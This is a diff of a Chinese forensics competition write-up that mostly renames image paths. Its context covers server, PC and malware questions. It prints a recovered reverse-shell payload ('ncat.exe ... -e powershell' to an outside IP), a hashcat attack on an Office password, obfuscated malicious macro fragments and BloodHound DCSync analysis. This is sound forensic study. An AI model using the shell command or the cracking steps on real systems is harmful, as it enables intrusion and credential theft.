 ### 24 分析服务器镜像，登录api网站后台，查询总Token消耗数量为?【答案格式：999.9K】
 #### 答案
@@ -967,7 +967,7 @@ node src/app.js
 一进/admin-next/dashboard就能看到
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/76.png" width="1402.5" title="" crop="0,0,1,1" id="u8204fbbd" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/76.png" width="1402.5" title="" crop="0,0,1,1" id="u8204fbbd" class="ne-image">
 
 （这题真的没和上一题放反吗（？））
 
@@ -979,16 +979,16 @@ node src/app.js
 一共就6条记录
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/77.png" width="1400" title="" crop="0,0,1,1" id="u50945845" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/77.png" width="1400" title="" crop="0,0,1,1" id="u50945845" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/78.png" width="1381.5" title="" crop="0,0,1,1" id="u5709a2b0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/78.png" width="1381.5" title="" crop="0,0,1,1" id="u5709a2b0" class="ne-image">
 
 本来想直接在这里看的，但是不管哪里显示的时间精确度都不够
 
 那只能去找日志文件了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/79.png" width="1426" title="" crop="0,0,1,1" id="ubaf75f1a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/79.png" width="1426" title="" crop="0,0,1,1" id="ubaf75f1a" class="ne-image">
 
 不确定在哪，所以全导出了
 
@@ -1082,22 +1082,22 @@ if __name__ == "__main__":
 然后发现在4个文件里面有
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/80.png" width="1141.5" title="" crop="0,0,1,1" id="uc12ae79b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/80.png" width="1141.5" title="" crop="0,0,1,1" id="uc12ae79b" class="ne-image">
 
 去4个文件里面看看
 
 然后会发现4个文件里面的信息一样
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/81.png" width="963" title="" crop="0,0,1,1" id="uffe1eb87" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/81.png" width="963" title="" crop="0,0,1,1" id="uffe1eb87" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/82.png" width="962" title="" crop="0,0,1,1" id="ueea7dfdf" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/82.png" width="962" title="" crop="0,0,1,1" id="ueea7dfdf" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/83.png" width="983" title="" crop="0,0,1,1" id="u04231c5a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/83.png" width="983" title="" crop="0,0,1,1" id="u04231c5a" class="ne-image">
 
 最后一个是service.log
 
-<img src="/Picture/WpDF/Pinghang/2026Group/84.png" width="976" title="" crop="0,0,1,1" id="u2c8c11a3" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/84.png" width="976" title="" crop="0,0,1,1" id="u2c8c11a3" class="ne-image">
 
 ### 26 分析服务器镜像，编写脚本，通过调用inject_bash_blocks函数，确定恶意投毒的payload。(提示：输入一段包含 bash 块的文本) 【答案格式：a.exe 192.168.1.122-i hello】
 #### 答案
@@ -1109,7 +1109,7 @@ ncat.exe 156.238.239.253 1314 -e powershell
 （下面那个连js都不是）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/85.png" width="1296.5" title="" crop="0,0,1,1" id="ue2d4167d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/85.png" width="1296.5" title="" crop="0,0,1,1" id="ue2d4167d" class="ne-image">
 
 将俩文件导出后，能很明显的发现
 
@@ -1122,7 +1122,7 @@ bash_block_injector_wasm/pkg/bash_block_injector.js
 因此要真正去看干了啥还得去bash_block_injector.js里面看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/86.png" width="1007" title="" crop="0,0,1,1" id="u62b799b2" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/86.png" width="1007" title="" crop="0,0,1,1" id="u62b799b2" class="ne-image">
 
 根据题目要求，需要准备一个测试用的bash块文本，调用一下bash_block_injector.js里面的inject_bash_blocks，看看会发生什么，或者说，会多出来什么东西
 
@@ -1139,7 +1139,7 @@ console.log(result);
 ```
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/87.png" width="1095.5" title="" crop="0,0,1,1" id="u708700fc" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/87.png" width="1095.5" title="" crop="0,0,1,1" id="u708700fc" class="ne-image">
 
 ### 27 接上题，should_inject_for_ua(ua,ip)对UA字符串有过滤条件，只有特定UA才会进入后续判断。请编写脚本找出有几个UA头能使函数有机会返 回true的UA关键词。【答案格式：1】【提示：备选项： cur1、openclaw、mozilla、wget、httpx、claude、requests、bot、crawler】
 #### 答案
@@ -1176,7 +1176,7 @@ for (const ua of uas)
 这样每个ua测试1000个IP，在极短的时间内传入两次即可令某些ua有概率能返回true
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/88.png" width="449.5" title="" crop="0,0,1,1" id="ub783f58b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/88.png" width="449.5" title="" crop="0,0,1,1" id="ub783f58b" class="ne-image">
 
 或者是第二种方式，直接爆破，枚举大量IP，分别测试不同的ua类型
 
@@ -1218,7 +1218,7 @@ console.log('over!');
 然后也能将对应的ua传入
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/89.png" width="473" title="" crop="0,0,1,1" id="u8ab38c59" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/89.png" width="473" title="" crop="0,0,1,1" id="u8ab38c59" class="ne-image">
 
 可以看出来俩方法都是2种
 
@@ -1265,7 +1265,7 @@ for (let gap = 10; gap <= 1000; gap+=10)
 ```
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/90.png" width="332" title="" crop="0,0,1,1" id="u5a1859d5" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/90.png" width="332" title="" crop="0,0,1,1" id="u5a1859d5" class="ne-image">
 
 ### 29 接上题，在UA条件和IP时间条件均满足的前提下，函数仍有一定概率返回false。请编写脚本估算触发概率，并推算概率1/N(即理论上平均每N次满 足前两个条件的调用才触发一次】。【答案格式：10,格式只保留整十】【提示：建议样本量不少于10000次有效检测(UA条件满足+IP时间条件满 足),不然四舍五入会出现进位问题。】
 #### 答案
@@ -1313,7 +1313,7 @@ for (let num = 0; num < 10; num++)
 最后算出来大概是50左右
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/91.png" width="442" title="" crop="0,0,1,1" id="ue507d037" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/91.png" width="442" title="" crop="0,0,1,1" id="ue507d037" class="ne-image">
 
 ## 计算机
 ### 30 # 请分析早起王的PC镜像，计算机系统Build版本是什么?【答案格式：12345.1234】【提示：仿真蓝屏是因存在0SDATA文件，删除后即可正常 仿真】
@@ -1326,7 +1326,7 @@ for (let num = 0; num < 10; num++)
 打不开的话重启三次就能进安全模式，把这个文件夹删了就行
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/92.png" width="432" title="" crop="0,0,1,1" id="u40320bcd" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/92.png" width="432" title="" crop="0,0,1,1" id="u40320bcd" class="ne-image">
 
 挂载虚拟机
 
@@ -1335,7 +1335,7 @@ for (let num = 0; num < 10; num++)
 winver
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/93.png" width="386" title="" crop="0,0,1,1" id="ud950490b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/93.png" width="386" title="" crop="0,0,1,1" id="ud950490b" class="ne-image">
 
 ### 31 请分析早起王的PC镜像，用户深情专一沼气王，她是我的生死劫的登陆密码LM哈希值后六位?【答案格式： abc123】
 #### 答案
@@ -1345,7 +1345,7 @@ winver
 火眼在绝大部分情况下还是很可靠的（？）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/94.png" width="1375.5" title="" crop="0,0,1,1" id="ude439576" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/94.png" width="1375.5" title="" crop="0,0,1,1" id="ude439576" class="ne-image">
 
 ### 32 请分析早起王的PC镜像，沼气王的桌面有本日记，请问沼气王暗恋对象的生日为?【答案格式：05月26日】
 #### 答案
@@ -1355,7 +1355,7 @@ winver
 打不开，发现有密码保护，试了几个常用的后发现给了掩码提示
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/95.png" width="430" title="" crop="0,0,1,1" id="u26d0de45" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/95.png" width="430" title="" crop="0,0,1,1" id="u26d0de45" class="ne-image">
 
 那还说啥了，hashcat启动！
 
@@ -1372,14 +1372,14 @@ hashcat.exe -m 34000 -a 3 "$office$*2007*20*128*16*227f374a6f8fbccc79c7abfe8636b
 ```
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/96.png" width="1171.5" title="" crop="0,0,1,1" id="ub83ea731" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/96.png" width="1171.5" title="" crop="0,0,1,1" id="ub83ea731" class="ne-image">
 
 得到密码ZqW2004
 
 我服了，怎么还有暗恋小说看（）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/97.png" width="671.5" title="" crop="0,0,1,1" id="u0252efd4" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/97.png" width="671.5" title="" crop="0,0,1,1" id="u0252efd4" class="ne-image">
 
 ### 33 请分析早起王的PC镜像，早起王受到过一封邮件，请找出邮件中隐写的秘密【答案格式： XXX，xxx】
 #### 答案
@@ -1389,21 +1389,21 @@ hashcat.exe -m 34000 -a 3 "$office$*2007*20*128*16*227f374a6f8fbccc79c7abfe8636b
 收件箱里面6个文件
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/98.png" width="1123" title="" crop="0,0,1,1" id="u517378e7" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/98.png" width="1123" title="" crop="0,0,1,1" id="u517378e7" class="ne-image">
 
 1、2、6系统文件直接忽略
 
 4和5就这玩意，不大可能有信息
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/99.png" width="436" title="" crop="0,0,1,1" id="ue1e7e053" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/99.png" width="436" title="" crop="0,0,1,1" id="ue1e7e053" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/100.png" width="936.5" title="" crop="0,0,1,1" id="u2477c6f5" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/100.png" width="936.5" title="" crop="0,0,1,1" id="u2477c6f5" class="ne-image">
 
 3内容如下
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/101.png" width="1064.5" title="" crop="0,0,1,1" id="u863880da" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/101.png" width="1064.5" title="" crop="0,0,1,1" id="u863880da" class="ne-image">
 
 通过网址
 
@@ -1412,7 +1412,7 @@ hashcat.exe -m 34000 -a 3 "$office$*2007*20*128*16*227f374a6f8fbccc79c7abfe8636b
 得到答案
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/102.png" width="792" title="" crop="0,0,1,1" id="ub1a5b487" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/102.png" width="792" title="" crop="0,0,1,1" id="ub1a5b487" class="ne-image">
 
 ### 34 请分析早起王的PC镜像， VeraCrypt容器的外层密码是什么?【答案格式： abc123】【提示：分析utools】
 #### 答案
@@ -1422,9 +1422,9 @@ qq520250520250520250
 uTools的note里面
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/103.png" width="1251.5" title="" crop="0,0,1,1" id="uf300611f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/103.png" width="1251.5" title="" crop="0,0,1,1" id="uf300611f" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/104.png" width="1242.5" title="" crop="0,0,1,1" id="u24f327cd" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/104.png" width="1242.5" title="" crop="0,0,1,1" id="u24f327cd" class="ne-image">
 
 ### 35 请分析早起王的PC镜像，早起王设置了一个AI女友，并自行导入过一个角色模型，该模型的原始文件名为?【答案格式： ABC.vrm】
 #### 答案
@@ -1434,7 +1434,7 @@ MANUKA.vrm
 桌面上有一个软件叫AIRI，鼠标移动上去就能看到是用于运行Virtual Character的
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/105.png" width="955.5" title="" crop="0,0,1,1" id="ubf0914dc" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/105.png" width="955.5" title="" crop="0,0,1,1" id="ubf0914dc" class="ne-image">
 
 （窗口莫名其妙滚到屏幕外面去了，Alt Tab切换到窗口后，Alt Space打开控制，然后点击移动M后使用上下左右键移动回屏幕中央）
 
@@ -1445,9 +1445,9 @@ MANUKA.vrm
 三个vrm文件，俩live2D，vrm文件有两个都是simple，那只可能是第一个了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/106.png" width="804" title="" crop="0,0,1,1" id="u0d2ce321" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/106.png" width="804" title="" crop="0,0,1,1" id="u0d2ce321" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/107.png" width="1013.5" title="" crop="0,0,1,1" id="u84557856" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/107.png" width="1013.5" title="" crop="0,0,1,1" id="u84557856" class="ne-image">
 
 ### 36 请分析早起王的PC镜像， AI女友使用的模型是什么?【答案格式： openai/GPT5.3-Codex-01-01】
 #### 答案
@@ -1459,11 +1459,11 @@ qwen/qwen3.5-flash-02-23
 里面有一个qq（边上那个一看就是样例），打开后切换到模块就能看到
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/108.png" width="1225" title="" crop="0,0,1,1" id="ud0f96593" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/108.png" width="1225" title="" crop="0,0,1,1" id="ud0f96593" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/109.png" width="786" title="" crop="0,0,1,1" id="u21ad7bea" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/109.png" width="786" title="" crop="0,0,1,1" id="u21ad7bea" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/110.png" width="771" title="" crop="0,0,1,1" id="u48ce33bc" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/110.png" width="771" title="" crop="0,0,1,1" id="u48ce33bc" class="ne-image">
 
 ### 37 请分析早起王的PC镜像，该PC中有一个离线大模型软件，其上次对话使用的模型是?【答案格式： ministra1-3-14b-reasoning】
 #### 答案
@@ -1473,7 +1473,7 @@ qwen2.5-coder-14b-instruct
 在LM Studio里面
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/111.png" width="1237.5" title="" crop="0,0,1,1" id="ud5b55022" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/111.png" width="1237.5" title="" crop="0,0,1,1" id="ud5b55022" class="ne-image">
 
 ### 38 请分析早起王的PC镜像，早起王曾删除一个MD5值为49B367AC261A722A7C2BBC328C32545的恶意文件，请尝试数据恢复并找到其文件名?【答案格 式：abc123】
 #### 答案
@@ -1485,14 +1485,14 @@ qwen2.5-coder-14b-instruct
 其次，我真傻，真的，我单知道打开这个txt文件，记事本告诉我文件太大打不开我就该想到的，这根本不可能是个正常的txt文件，我就应该想到这个很有可能就是VC加密的容器（躺）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/112.png" width="1239.5" title="" crop="0,0,1,1" id="ue0539644" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/112.png" width="1239.5" title="" crop="0,0,1,1" id="ue0539644" class="ne-image">
 
 用34题的内层密码解密这个文件后挂载，扔到火眼里面就能看到一堆被删掉的文件
 
 里面能一眼看到一个和MD5值一样的文件名，算一下MD5值还真是它
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/113.png" width="1363.5" title="" crop="0,0,1,1" id="u6267bb55" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/113.png" width="1363.5" title="" crop="0,0,1,1" id="u6267bb55" class="ne-image">
 
 ### 39 接上题，该文件中有多个流(streams)包含宏。请提供其中编号最小的一个。【答案格式：3】
 #### 答案
@@ -1508,7 +1508,7 @@ python oledump.py "%file_path%"
 windows能识别出来这玩意的病毒，最好扔虚拟机里面
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/114.png" width="1165" title="" crop="0,0,1,1" id="ub8160602" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/114.png" width="1165" title="" crop="0,0,1,1" id="ub8160602" class="ne-image">
 
 能看出来俩宏
 
@@ -1750,7 +1750,7 @@ Open(OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh# Put #K764B5Ph46Vh, 1, Wk4o3X7x
 f = open('C:\\Users\HUAWEI\Desktop\\病毒隔离区\\49b367ac261a722a7c2bbbc328c32545', 'rb').read()
 p = f.find(b'MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh')
 print(p)
-<img src="/Picture/WpDF/Pinghang/2026Group/115.png" width="1116.5" title="" crop="0,0,1,1" id="ua58f6d3f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/115.png" width="1116.5" title="" crop="0,0,1,1" id="ua58f6d3f" class="ne-image">
 
 148078，然后加上80，得到148158
 
@@ -2693,11 +2693,11 @@ pif
 那直接在文档中查找work就行了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/116.png" width="1203" title="" crop="0,0,1,1" id="u5c3f6d1b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/116.png" width="1203" title="" crop="0,0,1,1" id="u5c3f6d1b" class="ne-image">
 
 注意下面这张
 
-<img src="/Picture/WpDF/Pinghang/2026Group/117.png" width="1179.5" title="" crop="0,0,1,1" id="u30f172ab" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/117.png" width="1179.5" title="" crop="0,0,1,1" id="u30f172ab" class="ne-image">
 
 work是发送出去的（send），不是接收
 
@@ -2709,7 +2709,7 @@ work是发送出去的（send），不是接收
 注意到开头
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/118.png" width="776.5" title="" crop="0,0,1,1" id="ubb422bdf" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/118.png" width="776.5" title="" crop="0,0,1,1" id="ubb422bdf" class="ne-image">
 
 其拼接了一个字符串YIme（其实看到有一个pif，长得很像后缀，而且也确实是常见的文件后缀就感觉应该是了）
 
@@ -2718,28 +2718,28 @@ work是发送出去的（send），不是接收
 但目前不能确认是否是最终执行文件
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/119.png" width="239.5" title="" crop="0,0,1,1" id="ud0711dbf" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/119.png" width="239.5" title="" crop="0,0,1,1" id="ud0711dbf" class="ne-image">
 
 这里是用来删除旧文件的
 
 然后下面紧接着
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/120.png" width="541.5" title="" crop="0,0,1,1" id="u6b29f7db" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/120.png" width="541.5" title="" crop="0,0,1,1" id="u6b29f7db" class="ne-image">
 
 这里实例化了一个流对象m3mH，往里面写了一堆东西
 
 然后这个流对象将数据赋值给了c0xi，经过FXx9解密又扔给了ptF0（去看代码就知道，FXx9完全就是个类似RC4的玩意），将ptF0和前面那个文件路径一起扔给了NoRS
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/121.png" width="426.5" title="" crop="0,0,1,1" id="u31b58f33" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/121.png" width="426.5" title="" crop="0,0,1,1" id="u31b58f33" class="ne-image">
 
 显而易见，这玩意就是将ptF0里面的东西写入YIme的
 
 写完文件后出if块到c5ae函数
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/122.png" width="804" title="" crop="0,0,1,1" id="u76c1f443" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/122.png" width="804" title="" crop="0,0,1,1" id="u76c1f443" class="ne-image">
 
 可以看到，在c5ae函数中启用了这个文件
 
@@ -2753,7 +2753,7 @@ tbMu
 同样，先定位回work（毕竟work就相当于是通信成功），后面肯定有后续处理
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/123.png" width="796.5" title="" crop="0,0,1,1" id="u1a60f173" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/123.png" width="796.5" title="" crop="0,0,1,1" id="u1a60f173" class="ne-image">
 
 不难发现work下面就是fail
 
@@ -2771,19 +2771,19 @@ tbMu
 其名字是Internet Penetration，意味内网穿透
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/124.png" width="1297" title="" crop="0,0,1,1" id="ud18df5f9" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/124.png" width="1297" title="" crop="0,0,1,1" id="ud18df5f9" class="ne-image">
 
 于是推测（？）这张照片存在隐写
 
 用盲水印确实找出来东西了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/125.png" width="795" title="" crop="0,0,1,1" id="ue9e051ae" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/125.png" width="795" title="" crop="0,0,1,1" id="ue9e051ae" class="ne-image">
 
 这里说同开机密码
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/126.png" width="1439" title="" crop="0,0,1,1" id="u741de27d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/126.png" width="1439" title="" crop="0,0,1,1" id="u741de27d" class="ne-image">
 
 ### 50 根据早起王笔录内容，早起王曾经对某企业进行过渗透攻击，请分析域内实体关系， FILESERVER.XIAORANG.LAB对XIAORANG.LAB域拥有什么控 制权限?【答案格式： ABCabc】
 #### 答案
@@ -2799,19 +2799,19 @@ DCSync
 （刚打开只有俩节点不必惊慌，右键一下节点再左键，查找最短路径即可
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/127.png" width="1269" title="" crop="0,0,1,1" id="u20bd63cb" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/127.png" width="1269" title="" crop="0,0,1,1" id="u20bd63cb" class="ne-image">
 
 这时候去看起早王的U盘，会发现里面也有bloodhound，有gost，这些都是渗透用的工具
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/128.png" width="1326" title="" crop="0,0,1,1" id="uf056d5bd" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/128.png" width="1326" title="" crop="0,0,1,1" id="uf056d5bd" class="ne-image">
 
 里面那个bloodhound是sharphound搜集来的json文件压缩包
 
 将那个压缩包下载下来并导入bloodhound（导入自己bloodhound的就行，直接把这个zip往里面拖入即可）
 
 找不到相关信息
-<img src="/Picture/WpDF/Pinghang/2026Group/129.png" width="1439.5" title="" crop="0,0,1,1" id="u1b87c28b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/129.png" width="1439.5" title="" crop="0,0,1,1" id="u1b87c28b" class="ne-image">
 
 那我问你，
  DCSync  
@@ -2821,7 +2821,7 @@ DCSync
 也是一样，随便找个点右键选择最短路径就能出来
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/130.png" width="1261" title="" crop="0,0,1,1" id="u42a8785c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/130.png" width="1261" title="" crop="0,0,1,1" id="u42a8785c" class="ne-image">
 
 PS，这是我用虚拟机里面的那个bloodhound跑出来的（或者说电脑检材里面那个VC的表层加密容器里面的那个）
 我在自己电脑上的bloodhound就是跑不出来
@@ -2836,7 +2836,7 @@ ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB
 理应就是这条线：
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/131.png" width="990.5" title="" crop="0,0,1,1" id="uf3adb922" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/131.png" width="990.5" title="" crop="0,0,1,1" id="uf3adb922" class="ne-image">
 
 注意，中间的ACCOUNT OPERATORS@XIAORANG.LAB并不需要（首先是因为加上了与格式不符），而且，ZHANGXIN@XIAORANG.LAB是ACCOUNT OPERATORS@XIAORANG.LAB组的成员（MemberOf），对于后面的组，只是一个传递权限的载体，将权限传递给ZHANGXIN@XIAORANG.LAB用的
 
@@ -2846,38 +2846,38 @@ ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB
 首先，文件在这里
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/132.png" width="1266.5" title="" crop="0,0,1,1" id="u84b1213c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/132.png" width="1266.5" title="" crop="0,0,1,1" id="u84b1213c" class="ne-image">
 
 然后用无影（TScan）生成字典
 
 在前面找文件的时候，应该可以会发现有个文件叫早起王简历，按常识即可知道这玩意里面肯定藏（并非藏）有个人信息
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/133.png" width="1105" title="" crop="0,0,1,1" id="u56c73f70" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/133.png" width="1105" title="" crop="0,0,1,1" id="u56c73f70" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/134.png" width="1300.5" title="" crop="0,0,1,1" id="ub3fa3cc1" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/134.png" width="1300.5" title="" crop="0,0,1,1" id="ub3fa3cc1" class="ne-image">
 
 然后根据已有信息生成字典
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/135.png" width="1309.5" title="" crop="0,0,1,1" id="u40f5925e" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/135.png" width="1309.5" title="" crop="0,0,1,1" id="u40f5925e" class="ne-image">
 
 使用passware kit
 
 这里是如何添加自定义字典
-<img src="/Picture/WpDF/Pinghang/2026Group/136.png" width="1000.5" title="" crop="0,0,1,1" id="u566b35a0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/136.png" width="1000.5" title="" crop="0,0,1,1" id="u566b35a0" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/137.png" width="987" title="" crop="0,0,1,1" id="u243e6f3c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/137.png" width="987" title="" crop="0,0,1,1" id="u243e6f3c" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/138.png" width="960" title="" crop="0,0,1,1" id="uae653602" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/138.png" width="960" title="" crop="0,0,1,1" id="uae653602" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/139.png" width="1007" title="" crop="0,0,1,1" id="u0ee50101" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/139.png" width="1007" title="" crop="0,0,1,1" id="u0ee50101" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/140.png" width="1021.5" title="" crop="0,0,1,1" id="u762330ca" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/140.png" width="1021.5" title="" crop="0,0,1,1" id="u762330ca" class="ne-image">
 
 文件拖进来，保持顺序勾上，愿意的话可以把其他字典移除了
 
-<img src="/Picture/WpDF/Pinghang/2026Group/141.png" width="1017" title="" crop="0,0,1,1" id="ubc6d0f7b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/141.png" width="1017" title="" crop="0,0,1,1" id="ubc6d0f7b" class="ne-image">
 
 添加完成后将字典勾选上爆破即可（其实中等大小即可）
 
@@ -2888,12 +2888,12 @@ ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB
 直接添加攻击即可
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/142.png" width="982" title="" crop="0,0,1,1" id="u38cd0dab" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/142.png" width="982" title="" crop="0,0,1,1" id="u38cd0dab" class="ne-image">
 
 得到密码
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/143.png" width="1019.5" title="" crop="0,0,1,1" id="u0a6847ef" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/143.png" width="1019.5" title="" crop="0,0,1,1" id="u0a6847ef" class="ne-image">
 
 
 
@@ -2902,7 +2902,7 @@ ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB
 小故事写的挺好的（（（（（
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/144.png" width="1244.5" title="" crop="0,0,1,1" id="u803d0190" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/144.png" width="1244.5" title="" crop="0,0,1,1" id="u803d0190" class="ne-image">
 
 ### 53 早起王曾给倩倩发送过一封钓鱼邮件，请找到并计算附件MD5值【答案格式：字母不区分大小写】
 #### 答案
@@ -2912,28 +2912,28 @@ ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB
 既然说是早起王给倩倩发的，那把两边的邮箱都打开来看看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/145.png" width="566" title="" crop="0,0,1,1" id="uc1036494" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/145.png" width="566" title="" crop="0,0,1,1" id="uc1036494" class="ne-image">
 
